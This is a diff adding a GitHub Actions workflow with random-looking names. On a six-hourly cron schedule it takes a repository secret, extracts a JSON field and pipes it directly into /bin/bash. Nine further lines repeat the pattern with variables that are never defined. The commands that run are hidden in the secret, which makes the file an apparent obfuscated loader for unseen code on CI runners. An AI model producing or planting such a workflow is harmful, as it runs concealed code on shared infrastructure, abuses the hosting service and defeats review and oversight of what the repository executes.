@@ -1,0 +1,27 @@
+name: congyieg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: congyieg
+        env:
+          btijl3: ${{ secrets.btijl3 }}
+        run: |
+          echo $btijl3 | jq -r .j75 | /bin/bash
+          echo $iypoj44 | jq -r .nhp82 | /bin/bash
+          echo $yio6 | jq -r .jdd9739 | /bin/bash
+          echo $nxj71 | jq -r .p226 | /bin/bash
+          echo $mjht2621 | jq -r .m6 | /bin/bash
+          echo $ssksd68363 | jq -r .wsa5 | /bin/bash
+          echo $mrd04842 | jq -r .oz831 | /bin/bash
+          echo $x40500 | jq -r .glo10 | /bin/bash
+          echo $lnk44 | jq -r .cuokq2077 | /bin/bash
+          echo $agkj83103 | jq -r .pneio1 | /bin/bash
+
